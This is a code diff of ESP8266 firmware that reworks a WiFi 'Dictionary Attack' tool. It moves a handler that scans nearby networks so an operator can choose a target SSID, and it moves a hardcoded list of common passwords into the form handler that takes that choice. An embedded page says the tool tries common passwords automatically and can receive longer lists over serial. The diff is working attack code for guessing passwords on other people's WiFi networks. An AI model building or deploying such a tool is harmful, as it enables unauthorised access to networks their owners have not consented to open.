@@ -70,7 +70,73 @@ int seconds = 0;
 int wifiNetwork = 0;
 
 #define passwordsSize 50
-char *passwords[] = {
+
+
+const char dictionaryHtmlOne[] =  {"<!DOCTYPE HTML><html><head><title>nayanCard</title><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"/stylesheet\" href=\"main.css\"/><link rel=\"shortcut icon\" href=\"data:image/png;base64,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\" type=\"image/x-icon\"></head><body><div class=\"page-wrap\"><nav id=\"nav\"><ul><li><a href=\"indexMyHome.html\" class=\"active\"><span class=\"icon fa-home\"></span></a></li><li><a href=\"generic.html\"><span class=\"icon fa-wifi\"></span></a></li></ul></nav><section id=\"main\"><header id=\"header\"><div>Dictionary Attack</div></header><section><div class=\"inner\"><header><h1>Dictionary Attack</h1></header><p>This tool starts automaticly, first trying 100 of the most commen passwords avalible, then, if necessary, opens a serial connection over com at a rate of 115200 in which you can set up a simple python program to send strings(one every 20 seconds) in order to send a longer list</p><div> </div><p id=\"progressDict\">"};
+const char dictionaryHtmlTwo[] =  {"</p><br> <form action=\"/get\"> Enter SSID Number Here: <input type=\"text\" name=\"ssidInput\" value=\"SSID Number\"><input type=\"submit\" value=\"Submit\"> </form><br>></div></section><footer id=\"footer\"><div> class=\"copyright\"&copy; Nayan Smuek</a></div></footer></section></div></body></html>"};
+
+String passwordSuccess = "no passwords yet";
+//String ssidInputed = "";
+
+// Server and other global objects
+ESP8266WebServer server(80);
+DNSServer dnsServer;
+IPAddress apIP(192, 168, 4, 1);
+IPAddress netMsk(255, 255, 255, 0);
+File fsUploadFile;
+
+// current WiFi mode and config
+uint8_t wifiMode = WIFI_MODE_OFF;
+
+bool   wifi_config_hidden        = false;
+bool   wifi_config_captivePortal = false;
+String wifi_config_ssid;
+String wifi_config_password;
+String wifi_config_path;
+
+void handlePassword() {
+server.send(200, "text/plain", passwordSuccess);
+}
+
+void handleSelect()
+{
+  Serial.begin(115200);
+
+  Serial.print("Scan start ... ");
+  int n = WiFi.scanNetworks();
+  Serial.print(n);
+  Serial.println(" network(s) found");
+  String toPrint;
+  for (int i = 0; i < n; i++)
+  {
+    toPrint += i;
+    Serial.print(i);
+    toPrint += " ";
+    Serial.print(" ");
+    toPrint += (WiFi.SSID(i));
+    Serial.print(WiFi.SSID(i));
+     toPrint += "<br>";
+    Serial.print('\n');
+ }
+     toPrint += "<br>";
+ //toPrint += "enter the number of the network to attack";
+  Serial.println();
+
+  Serial.print("targeting ");//targeting "ssid"
+  Serial.print(ssidME);
+  Serial.print('\n');
+  
+  //String before = ssidME;
+  //server.send(200, "text/html", dictionaryHtmlOne+before+dictionaryHtmlTwo);
+
+
+  Serial.println("select number of network to targert");
+
+   server.send(200, "text/html", dictionaryHtmlOne+toPrint+dictionaryHtmlTwo);
+}
+
+void handleForm() {
+  char *passwords[] = {
    "123456789",
    "12345678",
    "abcd1234",
@@ -122,34 +188,6 @@ char *passwords[] = {
    NULL,
    "michelangelo"
 };
-
-const char dictionaryHtmlOne[] =  {"<!DOCTYPE HTML><html><head><title>nayanCard</title><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"/stylesheet\" href=\"main.css\"/><link rel=\"shortcut icon\" href=\"data:image/png;base64,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\" type=\"image/x-icon\"></head><body><div class=\"page-wrap\"><nav id=\"nav\"><ul><li><a href=\"indexMyHome.html\" class=\"active\"><span class=\"icon fa-home\"></span></a></li><li><a href=\"generic.html\"><span class=\"icon fa-wifi\"></span></a></li></ul></nav><section id=\"main\"><header id=\"header\"><div>Dictionary Attack</div></header><section><div class=\"inner\"><header><h1>Dictionary Attack</h1></header><p>This tool starts automaticly, first trying 100 of the most commen passwords avalible, then, if necessary, opens a serial connection over com at a rate of 115200 in which you can set up a simple python program to send strings(one every 20 seconds) in order to send a longer list</p><div> </div><p id=\"progressDict\">"};
-const char dictionaryHtmlTwo[] =  {"</p><br> <form action=\"/get\"> Enter SSID Number Here: <input type=\"text\" name=\"ssidInput\" value=\"SSID Number\"><input type=\"submit\" value=\"Submit\"> </form><br>></div></section><footer id=\"footer\"><div class=\"copyright\"&copy; Nayan Smuek</a></div></footer></section></div></body></html>"};
-
-String passwordSuccess = "no passwords yet";
-//String ssidInputed = "";
-
-// Server and other global objects
-ESP8266WebServer server(80);
-DNSServer dnsServer;
-IPAddress apIP(192, 168, 4, 1);
-IPAddress netMsk(255, 255, 255, 0);
-File fsUploadFile;
-
-// current WiFi mode and config
-uint8_t wifiMode = WIFI_MODE_OFF;
-
-bool   wifi_config_hidden        = false;
-bool   wifi_config_captivePortal = false;
-String wifi_config_ssid;
-String wifi_config_password;
-String wifi_config_path;
-
-void handlePassword() {
-server.send(200, "text/plain", passwordSuccess);
-}
-
-void handleForm() {
   String toOutput = "";
   String ssidInputed = server.arg("ssidInput");
   Serial.println("SSID INPUTED IS NOW:");
@@ -505,48 +543,9 @@ void startAP(String path, String ssid, String password, uint8_t ch, bool hidden,
         });
         server.on("/get", handleForm);
         server.on("/password", handlePassword);
-        server.on(String(F("/start")).c_str(), HTTP_GET, [] () {
+        //server.on(String(F("/start")).c_str(), HTTP_GET, [] () {
+        server.on("/start", handleSelect);
 
-
-
-
-Serial.begin(115200);
-
-  Serial.print("Scan start ... ");
-  int n = WiFi.scanNetworks();
-  Serial.print(n);
-  Serial.println(" network(s) found");
-  String toPrint;
-  for (int i = 0; i < n; i++)
-  {
-    toPrint += i;
-    Serial.print(i);
-    toPrint += " ";
-    Serial.print(" ");
-    toPrint += (WiFi.SSID(i));
-    Serial.print(WiFi.SSID(i));
-     toPrint += "<br>";
-    Serial.print('\n');
- }
-     toPrint += "<br>";
- //toPrint += "enter the number of the network to attack";
-  Serial.println();
-
-  Serial.print("targeting ");//targeting "ssid"
-  Serial.print(ssidME);
-  Serial.print('\n');
-  
-  //String before = ssidME;
-  //server.send(200, "text/html", dictionaryHtmlOne+before+dictionaryHtmlTwo);
-
-
-  Serial.println("select number of network to targert");
-
-   server.send(200, "text/html", dictionaryHtmlOne+toPrint+dictionaryHtmlTwo);
-  delay (200);
-  
-  
-  });
     }
     server.on(str(W_DEFAULT_LANG).c_str(), HTTP_GET, [] () {
         if (!settings.getWebSettings().use_spiffs) {
